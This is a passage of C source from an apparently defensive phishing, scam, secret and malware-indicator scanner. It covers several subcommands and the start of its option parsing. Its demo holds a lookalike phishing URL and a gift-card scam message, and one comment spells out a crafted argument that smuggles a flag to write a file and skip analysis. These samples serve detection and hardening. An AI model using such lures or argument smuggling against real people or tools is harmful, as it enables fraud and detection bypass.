                         band);
            json_field("next_steps", ns);
        }
        printf("}\n");
    } else if (av.score == 0) {
        const char *bs = hlse_blindspot_for("audit");
        int i;
        printf("OK    (audit \xe2\x80\x94 no issues found)  "
               "Hardening index: %d/100 (%s)\n", hi, band_disp);
        /* A clean verdict used to print nothing but this line, discarding the
         * INFO findings that say which checks could not read their evidence.
         * Those are exactly the caveats a reader needs when the headline says
         * everything is fine, so they are shown here. PASS rows stay hidden:
         * they would be noise on every clean run. */
        for (i = 0; i < av.n_findings; i++)
            if (av.findings[i].severity == AUDIT_INFO)
                printf("  [INFO] %s\n", av.findings[i].description);
        if (partial)
            printf("  \xe2\x9a\xa0 %d of %d checks could not read their evidence "
                   "\xe2\x80\x94 this is not a clean bill of health for those "
                   "checks; re-run as root for full coverage.\n",
                   av.checks_skipped, total);
        if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
    } else {
        int i;
        printf("%-7s [%d]  (system audit)  Hardening index: %d/100 (%s)\n",
               hlse_action_for_score(av.score), av.score, hi, band_disp);
        for (i = 0; i < av.n_findings; i++) {
            const char *sev_str[] = {
                "PASS", "INFO", "LOW", "MED", "HIGH", "CRIT"
            };
            int s = av.findings[i].severity;
            if (s < 0 || s > 5) s = 0;
            printf("  [%4s] %s\n", sev_str[s],
                   av.findings[i].description);
            if (s >= 4) {
                const char *fix = audit_remediation_for(
                    av.findings[i].description);
                if (fix)
                    printf("  \xe2\x9a\x92 Fix: %s\n", fix);
            }
        }
        if (crit_count > 0)
            printf("\xe2\x86\x92 Next step: fix the %d CRITICAL finding(s) first "
                   "\xe2\x80\x94 these are actively exploitable\n", crit_count);
        else if (high_count > 0)
            printf("\xe2\x86\x92 Next step: fix the %d HIGH finding(s) to improve "
                   "from '%s' toward the next hardening band\n",
                   high_count, band_disp);
        else
            printf("\xe2\x86\x92 Next step: address remaining findings to improve "
                   "the hardening index (currently %s: %d/100)\n",
                   band_disp, hi);
    }
    return av.score >= g_fail_threshold ? 1 : 0;
}

/* `file` subcommand, extracted verbatim from main(). */
static int
cmd_file(int argc, char **argv, int idx, const CliOpts *o) {
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s file <filepath>\n", argv[0]);
        return 2;
    }
    {
        FileVerdict fv;
        /* Display copy of the (attacker-controllable) filename: the raw
         * argv value is still used for I/O and analysis, but the plain-text
         * echo below must not carry ANSI/control bytes to the terminal
         * (CWE-150). JSON output escapes separately via json_escape. */
        char fdisp[4096];
        snprintf(fdisp, sizeof fdisp, "%s", argv[idx + 1]);
        hlse_sanitize_terminal(fdisp);
        /* If the file exists on disk, do full magic-byte + filename
         * analysis. If not, still check the NAME for disguise tricks
         * (RLO, double extension, lure words) — these are dangerous
         * regardless of whether the file is present locally.        */
        const char *name_only = NULL;
        if (access(argv[idx + 1], F_OK) == 0) {
            fv = hlse_check_file(argv[idx + 1]);
            /* The file is there but its bytes were not read (permissions, or
             * not a regular file), so F2/F3 magic-byte analysis never ran and
             * the verdict rests on the name alone. Silence here would present
             * a name-only guess as a full inspection. */
            if (!fv.content_read)
                name_only = "the file could not be read (permissions, or not "
                            "a regular file)";
        } else {
            const char *base = strrchr(argv[idx + 1], '/');
            base = base ? base + 1 : argv[idx + 1];
            fv = hlse_check_filename(base);
            name_only = "no such file here";
        }
        {
            const char *aar[16]; int aq, aqn = fv.n_reasons;
            if (aqn > 16) aqn = 16;
            for (aq = 0; aq < aqn; aq++) aar[aq] = fv.reasons[aq];
            hlse_alert_emit("file", fv.score,
                hlse_severity_for_score(fv.score), argv[idx + 1], aar, aqn);
        }
        if (o->json_out) {
            int i;
            char esc[512];
            hlse_json_escape(argv[idx + 1], esc, sizeof(esc));
            printf("{\"kind\":\"file\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"path\":\"%s\",\"score\":%d,"
                   "\"action\":\"%s\",\"severity\":%d,\"reasons\":[",
                   esc, fv.score, hlse_action_for_score(fv.score),
                   hlse_severity_for_score(fv.score));
            for (i = 0; i < fv.n_reasons; i++) {
                hlse_json_escape(fv.reasons[i], esc, sizeof(esc));
                printf("%s\"%s\"", i > 0 ? "," : "", esc);
            }
            printf("]");
            printf(",\"content_inspected\":%s", fv.content_read ? "true" : "false");
            if (name_only) {
                json_field("coverage", name_only);
            }
            if (fv.score == 0) {
                const char *bs = hlse_blindspot_for("file");
                json_field("blind_spot", bs);
            }
            if (fv.score >= 40) {
                /* Perspective 98: a single medium-confidence heuristic
                 * (e.g. Cabinet-magic/wrong-extension, +40) lands the
                 * file verdict in ALERT (40-59) alone, but this used to
                 * require score >= 60 for ANY advisory content at all —
                 * not even exoneration existed for "file" until this
                 * perspective. pattern/objective/verify now fire from
                 * the ALERT floor; triage/cascade_risk (post-open
                 * incident response) stay BLOCK+-only.
                 * Perspective 101: classification and advisory text now
                 * come from the shared accessors (see file_classify_
                 * pattern/file_masquerade_objective/file_masquerade_verify
                 * above) instead of a fourth independent copy. */
                const char *fpat = file_classify_pattern(&fv);
                json_field("pattern", fpat);
                printf(",\"pattern_id\":\"%s\"", file_pattern_id(fpat));
                json_field("objective", file_masquerade_objective());
                json_field("verify", file_masquerade_verify());
            }
            if (fv.score >= 60) {
                static const char file_tri[] =
                    "if already opened: disconnect from the network "
                    "immediately; run a full antivirus scan; change "
                    "credentials for any service you were logged into at "
                    "the time; consider a full OS reinstall for high-score "
                    "detections";
                static const char file_cas[] =
                    "all credentials and session tokens active when the file "
                    "was opened \xe2\x80\x94 malware runs with your session "
                    "context; also check for persistence (startup items, "
                    "scheduled tasks, browser extensions added)";
                json_field("triage", file_tri);
                json_field("cascade_risk", file_cas);
            }
            if (fv.score > 0 && fv.score < 60) {
                const char *ex = hlse_exoneration_for("file", fv.score);
                if (ex) {
                    json_field("exoneration", ex);
                }
            }
            printf("}\n");
        } else if (fv.score == 0) {
            const char *bs = hlse_blindspot_for("file");
            if (name_only) {
                printf("OK    %s (name only \xe2\x80\x94 contents NOT "
                       "inspected)\n", fdisp);
                printf("  \xe2\x9a\xa0 %s, so the magic-byte checks did not "
                       "run: this clears the filename, not the file.\n",
                       name_only);
            } else {
                printf("OK    %s\n", fdisp);
            }
            if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
        } else {
            print_file_verdict_plain(&fv, fdisp);
        }
        return fv.score >= g_fail_threshold ? 1 : 0;
    }
}

/* `text` subcommand, extracted verbatim from main(). */
static int
cmd_text(int argc, char **argv, int idx, const CliOpts *o) {
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s text \"<message>\"\n", argv[0]);
        return 2;
    }
    {
        /* Use unified scan — it runs text detection AND extracts
         * embedded URLs. This catches "Click here: https://g00gle.com" */
        ScanResult sr = hlse_scan(argv[idx + 1]);
        if (o->json_out) {
            /* Build TextVerdict from the unified ScanResult so the JSON
             * path honours embedded URL extraction (same as human path). */
            TextVerdict tv;
            text_verdict_from_scan(&tv, &sr);
            print_json_text(argv[idx + 1], &tv);
        } else if (sr.score == 0) {
            /* Channel-only risk: content scored 0 but delivery channel adds prior */
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                if (d > 0) {
                    const char *ch_rsn = channel_reason(g_from_channel);
                    const char *bs2 = hlse_blindspot_for("text");
                    printf("%-7s [%d]  (text) %.60s%s\n",
                           hlse_action_for_score(d), d, argv[idx + 1],
                           strlen(argv[idx + 1]) > 60 ? "..." : "");
                    if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
                    if (bs2) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs2);
                    return d >= g_fail_threshold ? 1 : 0;
                }
            }
            {
                char canon_brand[64];
                int has_c = sr.is_url &&
                            hlse_canonical_confirm(argv[idx + 1],
                                                   canon_brand, sizeof(canon_brand));
                const char *bs = hlse_blindspot_for(
                    has_c ? "url_canonical" : (sr.is_url ? "url" : "text"));
                printf("OK    (text)\n");
                if (has_c)
                    printf("  \xe2\x9c\x94 Canonical: confirmed authentic %s domain "
                           "(HLSE brand registry)\n", canon_brand);
                if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
            }
        } else {
            int i;
            int eff = sr.score;
            const char *ch_rsn = NULL;
            const char *ex;
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                eff += d; if (eff > 100) eff = 100;
                ch_rsn = channel_reason(g_from_channel);
            }
            printf("%-7s [%d]  (text) %.60s%s\n",
                   hlse_action_for_score(eff),
                   eff, argv[idx + 1],
                   strlen(argv[idx + 1]) > 60 ? "..." : "");
            for (i = 0; i < sr.n_reasons; i++) {
                if (strncmp(sr.reasons[i], "Amplifier:", 10) == 0) continue;
                printf("  \xc2\xb7 %s\n", sr.reasons[i]);
            }
            if (sr.is_url) {
                Verdict uv = check_url(argv[idx + 1]);
                print_url_advisories(argv[idx + 1], &uv);
                ex = hlse_url_exoneration(&uv);
            } else {
                TextVerdict tv;
                text_verdict_from_scan(&tv, &sr);
                print_text_advisories(&tv);
                ex = hlse_text_exoneration(&tv);
            }
            if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
            if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
        }
        {
            int eff_gate = sr.score;
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                eff_gate += d; if (eff_gate > 100) eff_gate = 100;
            }
            return eff_gate >= g_fail_threshold ? 1 : 0;
        }
    }
}

/* `secret` subcommand, extracted verbatim from main(). */
static int
cmd_secret(int argc, char **argv, int idx, const CliOpts *o) {
    /* 1 MiB, BSS-allocated (static) not stack — matches the shipped
     * pre-commit hook's 1 MB file-size guard so no in-scope file is
     * silently truncated (Perspective 105 / P1-2). */
    static char stdin_buf[1u << 20];
    const char *text;
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s secret \"<text>\" | %s secret --stdin\n",
                argv[0], argv[0]);
        return 2;
    } else if (strcmp(argv[idx + 1], "--stdin") == 0) {
        read_stdin_all(stdin_buf, sizeof(stdin_buf));
        text = stdin_buf;
    } else {
        text = argv[idx + 1];
    }
    {
        SecretVerdict sv = hlse_scan_secrets(text);
        {
            const char *aar[16]; char rb[16][300];
            int aq, aqn = sv.n_findings;
            if (aqn > 16) aqn = 16;
            for (aq = 0; aq < aqn; aq++) {
                snprintf(rb[aq], sizeof(rb[aq]), "%s: %s",
                         sv.findings[aq].type, sv.findings[aq].description);
                aar[aq] = rb[aq];
            }
            hlse_alert_emit("secret", sv.score,
                hlse_severity_for_score(sv.score), "(secret scan)", aar, aqn);
        }
        if (o->json_out) {
            int i;
            printf("{\"kind\":\"secret\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"score\":%d,\"action\":\"%s\","
                   "\"severity\":%d,\"findings\":[",
                   sv.score, hlse_action_for_score(sv.score),
                   hlse_severity_for_score(sv.score));
            for (i = 0; i < sv.n_findings; i++) {
                char et[64], ed[512];
                hlse_json_escape(sv.findings[i].type, et, sizeof(et));
                hlse_json_escape(sv.findings[i].description, ed, sizeof(ed));
                printf("%s{\"type\":\"%s\",\"description\":\"%s\"}",
                       i > 0 ? "," : "", et, ed);
            }
            printf("]");
            printf(",\"confidence\":\"%s\"", hlse_secret_confidence(&sv));
            {
                const char *rem = hlse_remediation_for("secret", sv.score);
                if (rem) {
                    json_field("remediation", rem);
                }
            }
            if (sv.score == 0) {
                const char *bs = hlse_blindspot_for("secret");
                json_field("blind_spot", bs);
            }
            json_secret_advisories(&sv);
            printf("}\n");
        } else if (sv.score == 0) {
            const char *bs = hlse_blindspot_for("secret");
            printf("OK    (secret \xe2\x80\x94 no credentials found)\n");
            if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
        } else {
            int i;
            const char *rem = hlse_remediation_for("secret", sv.score);
            const char *conf = hlse_secret_confidence(&sv);
            printf("%-7s [%d]  (secret scan — confidence: %s)\n",
                   hlse_action_for_score(sv.score), sv.score, conf);
            for (i = 0; i < sv.n_findings; i++)
                printf("  \xc2\xb7 [%s] %s\n",
                       sv.findings[i].type, sv.findings[i].description);
            if (strcmp(conf, "heuristic") == 0)
                printf("  \xe2\x86\x92 Confidence: heuristic — this is a "
                       "pattern guess (generic VAR=value / high-entropy "
                       "string); confirm it is a live credential.\n");
            print_secret_advisories(&sv);
            if (rem) printf("  \xe2\x86\x92 Action: %s\n", rem);
        }
        return sv.score >= g_fail_threshold ? 1 : 0;
    }
}

/* Names the evidence sources hlse_check_network() could not open, newest
 * concern first. Returns the count and fills `out` with static path strings.
 *
 * Each of N1..N4 is guarded by `if (fp)` and degrades silently, so on a host
 * without /proc (a minimal container, a non-Linux system) the check looks at
 * nothing and still returns score 0. Printed as "no anomalies detected" that
 * is indistinguishable from a real all-clear, which is the same failure the
 * package_unverified blind spot already calls out: nothing detected is not
 * nothing confirmed. Naming the missing sources is what makes the difference
 * visible to the reader.                                                  */
static int
network_unread_sources(const NetworkVerdict *v, const char *out[4]) {
    static const struct { int flag; const char *path; } SRC[] = {
        { HLSE_NET_SRC_ARP,    "/proc/net/arp"    },
        { HLSE_NET_SRC_ROUTE,  "/proc/net/route"  },
        { HLSE_NET_SRC_RESOLV, "/etc/resolv.conf" },
        { HLSE_NET_SRC_HOSTS,  "/etc/hosts"       }
    };
    int i, n = 0;
    for (i = 0; i < 4; i++)
        if (!(v->sources_read & SRC[i].flag)) out[n++] = SRC[i].path;
    return n;
}

/* `network` subcommand, extracted verbatim from main(). */
static int
cmd_network(int argc, char **argv, int idx, const CliOpts *o) {
    (void)argc; (void)argv; (void)idx;
    NetworkVerdict nv = hlse_check_network();
    const char *unread[4];
    int n_unread = network_unread_sources(&nv, unread);
    {
        const char *aar[16]; int aq, aqn = nv.n_reasons;
        if (aqn > 16) aqn = 16;
        for (aq = 0; aq < aqn; aq++) aar[aq] = nv.reasons[aq];
        hlse_alert_emit("network", nv.score,
            hlse_severity_for_score(nv.score), "(network)", aar, aqn);
    }
    if (o->json_out) {
        int i;
        printf("{\"kind\":\"network\",\"hlse_version\":\"" HLSE_VERSION "\","
               "\"score\":%d,\"action\":\"%s\","
               "\"severity\":%d,\"reasons\":[",
               nv.score, hlse_action_for_score(nv.score),
               hlse_severity_for_score(nv.score));
        for (i = 0; i < nv.n_reasons; i++) {
            char esc[512];
            hlse_json_escape(nv.reasons[i], esc, sizeof(esc));
            printf("%s\"%s\"", i > 0 ? "," : "", esc);
        }
        printf("]");
        if (n_unread > 0) {
            int u;
            printf(",\"sources_unavailable\":[");
            for (u = 0; u < n_unread; u++)
                printf("%s\"%s\"", u > 0 ? "," : "", unread[u]);
            printf("]");
        }
        if (nv.score == 0) {
            const char *bs = hlse_blindspot_for("network");
            json_field("blind_spot", bs);
        }
        if (nv.score > 0) {
            int ns = nv.n_reasons;
            const char *conf = ns >= 3 ? "high confidence" :
                               ns >= 2 ? "corroborated" : "single signal";
            printf(",\"signal_count\":%d,\"confidence\":\"%s\"", ns, conf);
        }
        if (nv.score >= 40) {
            /* Perspective 96: a single N2 (routing injection, +55) or N4
             * (hosts-file pharming, +50) finding lands in ALERT (40-59)
             * alone, but used to get no pattern/objective/verify — only
             * BLOCK+ (60) did, the same gap P95 closed for URL/text/
             * paste/scan. verify now fires from the ALERT floor;
             * triage/cascade_risk (post-incident, presumes the user
             * already acted) stay BLOCK+-only.
             * Perspective 103: text now shared with the plaintext path
             * below via network_*_text() accessors. */
            json_field("pattern", net_pattern_text());
            printf(",\"pattern_id\":\"HLSE-NET-C2\"");
            json_field("objective", network_objective_text());
            json_field("verify", network_verify_text());
        }
        if (nv.score >= 60) {
            json_field("triage", network_triage_text());
            json_field("cascade_risk", network_cascade_text());
        }
        if (nv.score > 0 && nv.score < 60) {
            const char *ex = hlse_exoneration_for("network", nv.score);
            if (ex) {
                json_field("exoneration", ex);
            }
        }
        printf("}\n");
    } else if (nv.score == 0) {
        const char *bs = hlse_blindspot_for("network");
        if (nv.sources_read == 0) {
            /* Nothing was read, so "no anomalies detected" would be a claim
             * about evidence that was never seen. Say what actually happened. */
            printf("OK    (network \xe2\x80\x94 nothing could be checked: none of "
                   "/proc/net or /etc was readable)\n");
        } else {
            printf("OK    (network \xe2\x80\x94 no anomalies detected)\n");
        }
        if (n_unread > 0) {
            int u;
            printf("  \xe2\x9a\xa0 Not checked (unreadable): ");
            for (u = 0; u < n_unread; u++)
                printf("%s%s", u > 0 ? ", " : "", unread[u]);
            printf("\n");
        }
        if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
    } else {
        int i;
        printf("%-7s [%d]  (network)\n",
               hlse_action_for_score(nv.score), nv.score);
        for (i = 0; i < nv.n_reasons; i++)
            printf("  \xc2\xb7 %s\n", nv.reasons[i]);
        if (nv.score >= 40) {
            printf("  \xe2\x96\xb8 Pattern: %s\n", net_pattern_text());
            printf("  \xe2\x97\x89 Attacker's goal: %s\n", network_objective_text());
            printf("  \xe2\x9c\x93 Verify first: %s\n", network_verify_text());
        }
        if (nv.score >= 60) {
            printf("  \xe2\x9a\x91 Immediate action: %s\n", network_triage_text());
            printf("  \xe2\x8a\x95 Also change: %s\n", network_cascade_text());
        }
        if (nv.score < 60) {
            const char *ex = hlse_exoneration_for("network", nv.score);
            if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
        }
    }
    return nv.score >= g_fail_threshold ? 1 : 0;
}

/* `esp` subcommand, extracted verbatim from main(). */
static int
cmd_esp(int argc, char **argv, int idx, const CliOpts *o) {
    /* EFI System Partition integrity (UEFI bootkit indicators). */
    const char *path = (argc > idx + 1) ? argv[idx + 1] : NULL;
    ProtectionVerdict pv = hlse_esp_verify(path);
    if (o->json_out) {
        int i;
        printf("{\"kind\":\"esp\",\"hlse_version\":\"" HLSE_VERSION "\","
               "\"score\":%d,\"action\":\"%s\","
               "\"severity\":%d,\"reasons\":[",
               pv.score, hlse_action_for_score(pv.score),
               hlse_severity_for_score(pv.score));
        for (i = 0; i < pv.n_reasons; i++) {
            char esc[512];
            hlse_json_escape(pv.reasons[i], esc, sizeof(esc));
            printf("%s\"%s\"", i > 0 ? "," : "", esc);
        }
        printf("]");
        printf(",\"target_scanned\":%s",
               pv.target_unreadable ? "false" : "true");
        {
            const char *bs = hlse_blindspot_for("esp");
            if (pv.score == 0 && bs) json_field("blind_spot", bs);
        }
        if (pv.score > 0) {
            int ns = pv.n_reasons;
            const char *conf = ns >= 3 ? "high confidence" :
                               ns >= 2 ? "corroborated" : "single signal";
            printf(",\"signal_count\":%d,\"confidence\":\"%s\"", ns, conf);
        }
        if (pv.score >= 60) {
            json_field("pattern", esp_pattern_text());
            printf(",\"pattern_id\":\"HLSE-ESP-BOOTKIT\"");
            json_field("objective", esp_objective_text());
            json_field("verify", esp_verify_text());
            json_field("triage", esp_triage_text());
            json_field("cascade_risk", esp_cascade_text());
        }
        if (pv.score > 0 && pv.score < 60) {
            const char *ex = hlse_exoneration_for("esp", pv.score);
            if (ex) {
                json_field("exoneration", ex);
            }
        }
        printf("}\n");
    } else if (pv.score == 0) {
        const char *bs = hlse_blindspot_for("esp");
        printf("OK    (esp)%s%s\n",
               pv.n_reasons ? " \xe2\x80\x94 " : "",
               pv.n_reasons ? pv.reasons[0] : "");
        if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
    } else {
        int i;
        printf("%-7s [%d]  (esp)\n",
               hlse_action_for_score(pv.score), pv.score);
        for (i = 0; i < pv.n_reasons; i++)
            printf("  \xc2\xb7 %s\n", pv.reasons[i]);
        if (pv.score >= 60) {
            printf("  \xe2\x96\xb8 Pattern: %s\n", esp_pattern_text());
            printf("  \xe2\x97\x89 Attacker's goal: %s\n", esp_objective_text());
            printf("  \xe2\x9c\x93 Verify first: %s\n", esp_verify_text());
            printf("  \xe2\x9a\x91 Immediate action: %s\n", esp_triage_text());
            printf("  \xe2\x8a\x95 Also change: %s\n", esp_cascade_text());
        } else {
            const char *ex = hlse_exoneration_for("esp", pv.score);
            if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
        }
    }
    return pv.score >= g_fail_threshold ? 1 : 0;
}

/* `clipboard` subcommand, extracted verbatim from main(). */
static int
cmd_clipboard(int argc, char **argv, int idx, const CliOpts *o) {
    if (argc < idx + 3) {
        fprintf(stderr,
                "Usage: %s clipboard \"<copied addr>\" \"<pasted addr>\"\n",
                argv[0]);
        return 2;
    }
    {
        CryptoSwapVerdict cv =
            hlse_check_crypto_swap(argv[idx + 1], argv[idx + 2]);
        {
            const char *aar[1]; int aqn = 0;
            if (cv.reason[0]) { aar[0] = cv.reason; aqn = 1; }
            hlse_alert_emit("clipboard", cv.score,
                hlse_severity_for_score(cv.score),
                cv.swapped[0] ? cv.swapped : "(clipboard)", aar, aqn);
        }
        const char *rem = hlse_remediation_for("clipboard", cv.score);
        if (o->json_out) {
            char eo[256], es[256], er[512], erm[512];
            hlse_json_escape(cv.original, eo, sizeof(eo));
            hlse_json_escape(cv.swapped, es, sizeof(es));
            hlse_json_escape(cv.reason, er, sizeof(er));
            hlse_json_escape(rem ? rem : "", erm, sizeof(erm));
            printf("{\"kind\":\"clipboard\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"score\":%d,\"action\":\"%s\","
                   "\"severity\":%d,"
                   "\"is_swap\":%d,"
                   "\"original\":\"%s\",\"swapped\":\"%s\",\"reason\":\"%s\","
                   "\"remediation\":\"%s\"",
                   cv.score, hlse_action_for_score(cv.score),
                   hlse_severity_for_score(cv.score),
                   cv.is_swap, eo, es, er, erm);
            if (cv.score == 0) {
                const char *bs = hlse_blindspot_for("clipboard");
                json_field("blind_spot", bs);
            }
            if (cv.score >= 60) {
                json_field("pattern", clipboard_pattern_text());
                printf(",\"pattern_id\":\"HLSE-CLIP-HIJACK\"");
                json_field("objective", clipboard_objective_text());
                json_field("verify", clipboard_verify_text());
                json_field("triage", clipboard_triage_text());
                json_field("cascade_risk", clipboard_cascade_text());
            }
            printf("}\n");
        } else if (cv.score == 0) {
            const char *bs = hlse_blindspot_for("clipboard");
            printf("OK    (clipboard \xe2\x80\x94 no address swap detected)\n");
            if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
        } else {
            printf("%-7s [%d]  (clipboard)\n",
                   hlse_action_for_score(cv.score), cv.score);
            if (cv.reason[0]) printf("  \xc2\xb7 %s\n", cv.reason);
            if (rem) printf("  \xe2\x86\x92 Action: %s\n", rem);
            if (cv.score >= 60) {
                printf("  \xe2\x96\xb8 Pattern: %s\n", clipboard_pattern_text());
                printf("  \xe2\x97\x89 Attacker's goal: %s\n", clipboard_objective_text());
                printf("  \xe2\x9c\x93 Verify first: %s\n", clipboard_verify_text());
                printf("  \xe2\x9a\x91 If you acted: %s\n", clipboard_triage_text());
                printf("  \xe2\x8a\x95 Also change: %s\n", clipboard_cascade_text());
            }
        }
        return cv.score >= g_fail_threshold ? 1 : 0;
    }
}


int
main(int argc, char **argv) {
    int json_out = 0;
    int quiet = 0;
    int sarif_out = 0;
    int opt_syslog = 0;
    const char *opt_log_file = NULL;
    int argc_flags;   /* argv index where "--" ends option scanning */
    CliOpts opts;
    int idx = 1;

    if (argc < 2) {
        /* Apple principle: the first experience IS the product.
         * Instead of a wall of usage text, show a live demo so the
         * user understands in 5 seconds what HLSE does.              */
        printf("HLSE %s — phishing & scam detection\n\n", HLSE_VERSION);

        printf("  Safe URL:\n");
        { Verdict v = check_url("https://github.com");
          printf("    https://github.com");
          printf("  →  %s\n\n", action_for_score(v.score)); }

        printf("  Phishing URL:\n");
        { Verdict v = check_url("https://g00gle.com");
          int i;
          printf("    https://g00gle.com");
          printf("  →  %s [%d/100]\n", action_for_score(v.score), v.score);
          for (i = 0; i < v.n_reasons; i++)
              printf("      %s\n", v.reasons[i]);
          printf("\n"); }

        printf("  Safe message:\n");
        { TextVerdict v = hlse_check_text("Meeting at 3pm tomorrow");
          printf("    \"Meeting at 3pm tomorrow\"");
          printf("  →  %s\n\n", hlse_text_action_for_score(v.score)); }

        printf("  Scam message:\n");
        { TextVerdict v = hlse_check_text(
              "URGENT: Buy iTunes gift cards immediately to unlock your account");
          int i;
          printf("    \"URGENT: Buy iTunes gift cards...\"\n");
          printf("                                     →  %s [%d/100]\n",
                 hlse_text_action_for_score(v.score), v.score);
          for (i = 0; i < v.n_reasons; i++)
              printf("      %s\n", v.reasons[i]);
          printf("\n"); }

        printf("Try it:  %s <url>           Scan a URL\n", argv[0]);
        printf("         %s text \"<msg>\"    Scan text\n", argv[0]);
        printf("         %s package <name>  Check for typosquat\n", argv[0]);
        printf("         %s paste \"<cmd>\"   Check pasted command\n", argv[0]);
        printf("         %s protect <dir>   Ransomware scan\n", argv[0]);
        printf("         %s network         Network safety check\n", argv[0]);
        printf("         %s --help          All options\n", argv[0]);

        return 0;
    }

    /* End-of-options boundary. Global flags are matched "anywhere" for
     * convenience, but that must never reach OPERAND positions: an operand is
     * attacker-influenced data (a scanned URL, message, package name, clipboard
     * string). Without a boundary, a crafted operand such as
     *   hlse_core clipboard "--log-file" "/tmp/x"
     * is consumed as a flag — creating a file from scan data, and worse,
     * shifting argv so the real input is never analysed while the process still
     * exits 0 ("safe"). That is a silent detection bypass.
     *
     * `--` marks the end of options: everything after it is data, never a flag.
     * argc_flags bounds every flag loop below; the marker itself is removed
     * once, here, so the subcommand dispatch never sees it. */
    argc_flags = argc;
    {
        int i;
        for (i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--") == 0) {
                argc_flags = i;                     /* scan flags only before it */
                { int j; for (j = i; j < argc - 1; j++) argv[j] = argv[j+1]; argc--; }
                break;
            }
        }
        if (argc_flags > argc) argc_flags = argc;
    }

    /* Boolean global flags: one table, one pass. These were six separate
     * scan loops that differed only in the flag name and the variable set,
     * each restating the argv-shifting logic. Adding a flag is now a row. */
    {
        struct { const char *name; const char *alias; int *flag; } bools[] = {
            { "--json",         NULL, &json_out            },
            { "--sarif",        NULL, &sarif_out           },
            { "--quiet",        "-q", &quiet               },
            { "--syslog",       NULL, &opt_syslog          },
            { "--fingerprints", NULL, &g_emit_fingerprints },
            { "--git-history",  NULL, &g_git_history       },
        };
        const int nbools = (int)(sizeof(bools) / sizeof(bools[0]));
        int i, k;
        for (i = 1; i < argc_flags; i++) {
            for (k = 0; k < nbools; k++) {
                if (strcmp(argv[i], bools[k].name) == 0 ||
                    (bools[k].alias && strcmp(argv[i], bools[k].alias) == 0)) {
                    *bools[k].flag = 1;
                    argv_remove(argv, &argc, &argc_flags, i, 1);
                    i--;            /* re-examine the element shifted into i */
                    break;
                }
            }
        }
    }

    /* Parse --fail-on <tier> (anywhere) — the machine consumer's risk gate.
     * The exit code (1 = threat) collapses five severity tiers into pass/fail;
     * hardcoding the boundary at BLOCK(60) imposes one risk posture on every
     * pipeline. A payments repo may want to fail at ALERT(40); a noisy docs
     * repo only at ISOLATE(80). This sets the score at/above which the process
     * exits 1. Default stays 60 (block) for backward compatibility.        */
    {
        int i;
        for (i = 1; i < argc_flags - 1; i++) {
            if (strcmp(argv[i], "--fail-on") == 0) {
                const char *t = argv[i + 1];
                if      (strcmp(t, "log")     == 0) g_fail_threshold = 15;
                else if (strcmp(t, "alert")   == 0) g_fail_threshold = 40;
                else if (strcmp(t, "block")   == 0) g_fail_threshold = 60;
                else if (strcmp(t, "isolate") == 0) g_fail_threshold = 80;
                else {
                    /* Accept a bare numeric threshold (0..100) too. */
                    char *end;
                    long n = strtol(t, &end, 10);
                    if (*end == '\0' && n >= 0 && n <= 100)
                        g_fail_threshold = (int)n;
                    else {
                        fprintf(stderr, "Error: --fail-on expects "
                                "log|alert|block|isolate or 0..100\n");
                        return 2;
                    }
                }
                argv_remove(argv, &argc, &argc_flags, i, 2);
                break;
            }
        }
    }

    /* Parse --from <channel> — delivery-channel prior for URL risk boost.
     * Socratic: the same URL in an unsolicited SMS is riskier than one typed
     * by hand.  The flag lets callers supply that context so the verdict
     * reflects real-world threat priors, not just URL structure alone.     */
    {
        int i;
        for (i = 1; i < argc_flags - 1; i++) {
            if (strcmp(argv[i], "--from") == 0) {
                const char *ch = argv[i + 1];
                if (strcmp(ch, "email")  == 0 || strcmp(ch, "sms") == 0 ||
                    strcmp(ch, "dm")     == 0 || strcmp(ch, "qr")  == 0 ||
                    strcmp(ch, "manual") == 0) {
                    g_from_channel = ch;
                } else {
                    fprintf(stderr,
                            "Error: --from expects email|sms|dm|qr|manual\n");
                    return 2;
                }
                argv_remove(argv, &argc, &argc_flags, i, 2);
                break;
            }
        }
    }

    /* Parse --baseline <file> (Perspective 107 / P0-1) — suppress findings
     * whose fingerprint is listed, so a brownfield repo's accepted findings
     * do not fail the CI gate forever. */
    {
        int i;
        for (i = 1; i < argc_flags - 1; i++) {
            if (strcmp(argv[i], "--baseline") == 0) {
                g_baseline_file = argv[i + 1];
                argv_remove(argv, &argc, &argc_flags, i, 2);
                break;
            }
        }
    }

    /* Parse --log-file <path> (value) — append one JSONL record per finding. */
    {
        int i;
        for (i = 1; i < argc_flags - 1; i++) {
            if (strcmp(argv[i], "--log-file") == 0) {
                opt_log_file = argv[i + 1];
                argv_remove(argv, &argc, &argc_flags, i, 2);
                break;
            }
        }
    }

    /* Parse --patterns <file> (Perspective 110 / P0-3) — register custom
     * organization-specific secret patterns without a rebuild. */
    {
        int i;
        for (i = 1; i < argc_flags - 1; i++) {
            if (strcmp(argv[i], "--patterns") == 0) {
                const char *ppath = argv[i + 1];
                if (hlse_patterns_load(ppath) != 0) {
                    fprintf(stderr, "Error: cannot read --patterns file '%s': %s\n",
                            ppath, strerror(errno));
                    return 2;
                }
                argv_remove(argv, &argc, &argc_flags, i, 2);
                break;
            }
        }
    }

    /* Load the baseline file now that flags are parsed. A missing/unreadable
     * baseline is a usage error — silently ignoring it would let the gate
     * pass on a typo'd path, defeating the purpose. */
